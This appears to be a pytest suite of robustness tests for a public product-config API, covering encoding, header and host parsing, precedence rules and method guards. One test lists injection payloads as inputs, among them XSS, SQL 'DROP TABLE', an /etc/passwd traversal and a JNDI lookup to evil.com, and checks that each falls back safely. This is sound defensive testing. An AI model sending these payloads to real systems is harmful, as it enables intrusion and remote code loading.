"""
Adversarial Stress & Robustness Tests for Public Product Config API (Milestone 1)

Empirically challenges:
- Malformed query strings, URL encoding, whitespace, injection attempts
- Uppercase headers, whitespace in headers, invalid vertical headers
- IPv4/IPv6 hosts, host port splitting, uppercase hosts, dash-prefixes
- Multi-tier precedence resolution
- Method not allowed guards (POST, PUT, DELETE)
- AST LLM isolation & deterministic immutability
"""

import ast
import pytest
from app.api.public import resolve_vertical_key, VERTICAL_CONFIGS


class TestAdversarialPublicConfigQuery:
    def test_encoded_characters_healthcare(self, client):
        """%68 is 'h' -> FastAPI and resolve_vertical_key must resolve healthcare."""
        response = client.get("/api/public/product-config?vertical=%68ealthcare")
        assert response.status_code == 200
        data = response.json()
        assert data["vertical_key"] == "healthcare"
        assert data["demo_org_id"] == "demo-northstar-health"

    def test_encoded_characters_legal(self, client):
        """Full percent-encoding %6C%65%67%61%6C is 'legal'."""
        response = client.get("/api/public/product-config?vertical=%6C%65%67%61%6C")
        assert response.status_code == 200
        data = response.json()
        assert data["vertical_key"] == "legal"
        assert data["demo_org_id"] == "demo-northstar-cole"

    def test_whitespace_padding_query(self, client):
        """Whitespace around query param should be stripped safely."""
        response = client.get("/api/public/product-config?vertical=%20healthcare%20")
        assert response.status_code == 200
        data = response.json()
        assert data["vertical_key"] == "healthcare"

    def test_uppercase_and_mixed_case_query(self, client):
        """Uppercase and mixed case must normalize to valid key."""
        res_h = client.get("/api/public/product-config?vertical=HEALTHCARE")
        assert res_h.status_code == 200
        assert res_h.json()["vertical_key"] == "healthcare"

        res_l = client.get("/api/public/product-config?vertical=LeGaL")
        assert res_l.status_code == 200
        assert res_l.json()["vertical_key"] == "legal"

        res_g = client.get("/api/public/product-config?vertical=GeNeRaL")
        assert res_g.status_code == 200
        assert res_g.json()["vertical_key"] == "general"

    def test_empty_and_blank_query(self, client):
        """Empty query value falls back cleanly to general."""
        response = client.get("/api/public/product-config?vertical=")
        assert response.status_code == 200
        assert response.json()["vertical_key"] == "general"

    def test_injection_strings_query(self, client):
        """SQL injection, XSS, and command injection attempts fall back safely to general."""
        malicious_inputs = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "healthcare; DROP TABLE users;--",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "healthcare%00legal",
        ]
        for payload in malicious_inputs:
            res = client.get(f"/api/public/product-config?vertical={payload}")
            assert res.status_code == 200
            assert res.json()["vertical_key"] == "general"

    def test_huge_query_string(self, client):
        """Extremely large query parameter does not trigger ReDoS or memory issues."""
        huge = "a" * 15000
        res = client.get(f"/api/public/product-config?vertical={huge}")
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "general"


class TestAdversarialPublicConfigHeaders:
    def test_uppercase_and_whitespace_header(self, client):
        """Header with uppercase and whitespace normalizes properly."""
        res = client.get("/api/public/product-config", headers={"X-ResilAI-Vertical": "  HEALTHCARE  "})
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "healthcare"

        res_legal = client.get("/api/public/product-config", headers={"X-ResilAI-Vertical": "\tlegal\n"})
        assert res_legal.status_code == 200
        assert res_legal.json()["vertical_key"] == "legal"

    def test_invalid_header_fallback(self, client):
        """Invalid header value falls back to general."""
        res = client.get("/api/public/product-config", headers={"X-ResilAI-Vertical": "crypto_trading"})
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "general"


class TestAdversarialPublicConfigHost:
    def test_host_with_port(self, client):
        """Host header with port split correctly."""
        res = client.get("/api/public/product-config", headers={"Host": "healthcare.staging.resilai.org:443"})
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "healthcare"

        res_legal = client.get("/api/public/product-config", headers={"Host": "legal.staging.resilai.org:8080"})
        assert res_legal.status_code == 200
        assert res_legal.json()["vertical_key"] == "legal"

    def test_host_uppercase(self, client):
        """Uppercase host normalizes correctly."""
        res = client.get("/api/public/product-config", headers={"Host": "HEALTHCARE.STAGING.RESILAI.ORG"})
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "healthcare"

    def test_host_ipv4_ipv6(self, client):
        """IPv4 and IPv6 hosts do not throw index errors or unhandled exceptions."""
        res_ipv4 = client.get("/api/public/product-config", headers={"Host": "127.0.0.1:8000"})
        assert res_ipv4.status_code == 200
        assert res_ipv4.json()["vertical_key"] == "general"

        res_ipv6 = client.get("/api/public/product-config", headers={"Host": "[::1]:8000"})
        assert res_ipv6.status_code == 200
        assert res_ipv6.json()["vertical_key"] == "general"

    def test_host_dashed_preview_domains(self, client):
        """Dashed preview domains resolve correctly."""
        res_h = client.get("/api/public/product-config", headers={"Host": "healthcare-preview.run.app"})
        assert res_h.status_code == 200
        assert res_h.json()["vertical_key"] == "healthcare"

        res_l = client.get("/api/public/product-config", headers={"Host": "legal-staging.firebaseapp.com"})
        assert res_l.status_code == 200
        assert res_l.json()["vertical_key"] == "legal"


class TestAdversarialPublicConfigPrecedence:
    def test_query_overrides_header_and_host(self, client):
        """Query > Header > Host."""
        res = client.get(
            "/api/public/product-config?vertical=legal",
            headers={"X-ResilAI-Vertical": "healthcare", "Host": "healthcare.staging.resilai.org"},
        )
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "legal"

    def test_invalid_query_yields_to_header(self, client):
        """Invalid Query -> Header wins."""
        res = client.get(
            "/api/public/product-config?vertical=unknown",
            headers={"X-ResilAI-Vertical": "legal", "Host": "healthcare.staging.resilai.org"},
        )
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "legal"

    def test_invalid_query_and_header_yields_to_host(self, client):
        """Invalid Query & Header -> Host wins."""
        res = client.get(
            "/api/public/product-config?vertical=unknown",
            headers={"X-ResilAI-Vertical": "unknown", "Host": "healthcare.staging.resilai.org"},
        )
        assert res.status_code == 200
        assert res.json()["vertical_key"] == "healthcare"


class TestAdversarialMethodsAndImmutability:
    def test_disallowed_methods(self, client):
        """Endpoint only accepts GET. POST, PUT, DELETE must return 405."""
        assert client.post("/api/public/product-config").status_code == 405
        assert client.put("/api/public/product-config").status_code == 405
        assert client.delete("/api/public/product-config").status_code == 405
        assert client.patch("/api/public/product-config").status_code == 405

    def test_response_immutability(self, client):
        """Repeated identical requests return bit-exact JSON structures."""
        res1 = client.get("/api/public/product-config?vertical=healthcare").json()
        res2 = client.get("/api/public/product-config?vertical=healthcare").json()
        assert res1 == res2
        assert res1["vertical_key"] == "healthcare"
        assert res1["display_name"] == "ResilAI Healthcare"
        assert res1["industry_label"] == "Healthcare"
        assert isinstance(res1["focus_areas"], list)
        assert len(res1["focus_areas"]) >= 3
